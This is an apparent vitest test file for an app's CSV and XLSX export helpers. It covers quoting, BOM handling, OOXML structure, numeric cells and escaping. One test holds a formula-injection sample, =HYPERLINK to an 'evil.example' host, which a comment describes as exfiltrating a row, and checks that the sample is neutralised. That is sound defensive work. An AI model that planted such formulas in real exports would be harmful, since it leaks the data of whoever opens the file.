import { execFileSync } from "node:child_process";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";

import { csvCell, neutralise, toCsv } from "./csv";
import { columnRef, toXlsx } from "./xlsx";

describe("CSV", () => {
  it("quotes only what RFC 4180 requires", () => {
    expect(csvCell("plain")).toBe("plain");
    expect(csvCell("has,comma")).toBe('"has,comma"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("two\nlines")).toBe('"two\nlines"');
  });

  it("neutralises the cells a spreadsheet would execute", () => {
    // The attack this exists for: a value that looks like an extracted answer
    // and exfiltrates the row when someone else opens the file.
    expect(neutralise('=HYPERLINK("https://evil.example","x")')).toBe(
      '\'=HYPERLINK("https://evil.example","x")',
    );
    for (const leader of ["=", "+", "-", "@"]) {
      expect(neutralise(`${leader}cmd`).startsWith("'")).toBe(true);
    }
    expect(neutralise("normal")).toBe("normal");
  });

  it("leads with a BOM so Excel on Windows does not mangle non-ASCII", () => {
    const csv = toCsv(["a"], [["Müller"]]);
    expect(csv.codePointAt(0)).toBe(0xfeff);
    expect(csv).toContain("Müller");
  });

  it("uses the field key as the header, which is the immutable name", () => {
    const csv = toCsv(["sample_size", "design"], [["412", "RCT"]]);
    expect(csv).toContain("sample_size,design");
    expect(csv).not.toContain("Sample size");
  });

  it("ends every record with CRLF", () => {
    expect(toCsv(["a"], [["1"], ["2"]])).toBe("\uFEFFa\r\n1\r\n2\r\n");
  });
});

describe("XLSX", () => {
  it("numbers columns the way spreadsheets do", () => {
    expect(columnRef(0)).toBe("A");
    expect(columnRef(25)).toBe("Z");
    expect(columnRef(26)).toBe("AA");
    expect(columnRef(27)).toBe("AB");
    expect(columnRef(51)).toBe("AZ");
    expect(columnRef(52)).toBe("BA");
  });

  /*
   * Verified with the system `unzip` rather than by parsing the archive with
   * more of my own code. Reading my own output with my own reader would agree
   * with itself about a wrong offset or a wrong CRC; `unzip -t` checks every
   * CRC against an independent implementation.
   */
  const unzipDir = () => {
    const dir = mkdtempSync(join(tmpdir(), "Porcupine-xlsx-"));
    return dir;
  };

  it("produces an archive an independent unzip accepts", () => {
    const dir = unzipDir();
    const file = join(dir, "evidence.xlsx");
    writeFileSync(
      file,
      toXlsx([
        ["title", "n"],
        ["Alpha", 9],
      ]),
    );

    // -t verifies every entry's CRC. Throws on a non-zero exit.
    const out = execFileSync("unzip", ["-t", file], { encoding: "utf8" });
    expect(out).toContain("No errors detected");
  });

  it("contains exactly the OOXML parts Excel requires", () => {
    const dir = unzipDir();
    const file = join(dir, "evidence.xlsx");
    writeFileSync(file, toXlsx([["title"]]));

    const listing = execFileSync("unzip", ["-Z1", file], { encoding: "utf8" });
    expect(listing.split("\n").filter(Boolean).sort()).toEqual([
      "[Content_Types].xml",
      "_rels/.rels",
      "xl/_rels/workbook.xml.rels",
      "xl/workbook.xml",
      "xl/worksheets/sheet1.xml",
    ]);
  });

  it("writes numbers as numeric cells, so a column can be averaged", () => {
    const dir = unzipDir();
    const file = join(dir, "evidence.xlsx");
    writeFileSync(file, toXlsx([["n"], [412], ["not reported"]]));

    const sheet = execFileSync("unzip", ["-p", file, "xl/worksheets/sheet1.xml"], {
      encoding: "utf8",
    });

    // 412 is a bare <v>, with no t="inlineStr". This is the assertion the
    // whole file exists for: written as a string it would open fine and be
    // impossible to average.
    expect(sheet).toContain('<c r="A2"><v>412</v></c>');
    expect(sheet).toContain('<c r="A3" t="inlineStr">');
  });

  it("drops control characters that would make Excel reject the workbook", () => {
    const dir = unzipDir();
    const file = join(dir, "evidence.xlsx");
    // \u0001 is illegal in XML 1.0 even as a numeric entity, so Excel rejects
    // the whole workbook rather than skipping the cell. PDFs produce these.
    writeFileSync(file, toXlsx([["a"], ["bad\u0001text"]]));

    const sheet = execFileSync("unzip", ["-p", file, "xl/worksheets/sheet1.xml"], {
      encoding: "utf8",
    });
    expect(sheet).toContain("badtext");
    // eslint-disable-next-line no-control-regex
    expect(sheet).not.toMatch(/[\u0000-\u0008\u000B\u000C\u000E-\u001F]/);
  });

  it("escapes markup rather than emitting it", () => {
    const dir = unzipDir();
    const file = join(dir, "evidence.xlsx");
    writeFileSync(file, toXlsx([["a"], ["<b>Smith & Jones</b>"]]));

    const sheet = execFileSync("unzip", ["-p", file, "xl/worksheets/sheet1.xml"], {
      encoding: "utf8",
    });
    expect(sheet).toContain("&lt;b&gt;Smith &amp; Jones&lt;/b&gt;");
  });

  it("neutralises formulas in the xlsx too, not only the csv", () => {
    const dir = unzipDir();
    const file = join(dir, "evidence.xlsx");
    writeFileSync(file, toXlsx([["a"], ["=1+1"]]));

    const sheet = execFileSync("unzip", ["-p", file, "xl/worksheets/sheet1.xml"], {
      encoding: "utf8",
    });
    expect(sheet).toContain(`<t xml:space="preserve">'=1+1</t>`);
  });

  it("is byte-identical for identical input", () => {
    // A fixed mtime, so a diff of two exports shows a changed review rather
    // than a changed clock.
    expect(toXlsx([["a"], [1]]).equals(toXlsx([["a"], [1]]))).toBe(true);
  });
});
